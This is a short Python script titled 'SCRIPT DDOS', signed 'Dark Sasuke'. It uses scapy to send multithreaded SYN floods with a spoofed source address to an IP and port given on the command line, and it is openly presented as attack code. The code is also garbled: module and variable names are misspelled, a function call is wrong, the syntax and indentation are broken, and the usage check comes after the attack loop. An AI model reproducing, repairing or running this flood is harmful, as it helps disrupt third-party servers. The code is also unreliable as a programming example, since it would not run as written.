SCRIPT DDOS
#!/usr/bin/env python
from scapy.all import *
from time import sleep
import os,sys,re,commands,signal,logging,random
import theard
traget = str(sys.argv[1])
ddport = int(sys.argv[2])
theards = int(sys.argv[3])

def tcpdos(target,ddport):
  while 1:
    try:
      x = random.random(1023,65535)
      spoof = "208.67.222.220"
      send(IP(dst=target,src=spoof)/TCP(sport=x,dport=ddport,flags="S"),verbose1)

    except:
    pass

def shutdown(signal,frame):
  print "CTRL+C was pressed,shutting down"
  sys.exit()

signal.signal(signal.SIGINT, shutdown):
print "use CTRL+C to stopping the attack"
print "the attacking is starting..."
sleep(2)

for t in range(0,theards):
  theard.start_new_theard(tcpdos,(target,ddport))
  while 1:
  sleep(1)

if len(sys.argv) != 4:
 print "Usage: python hasil.py <ip> <port> <theards>"
 print "Coded By Dark Sasuke."
 print "Dark Sasuke"
 sys.exit()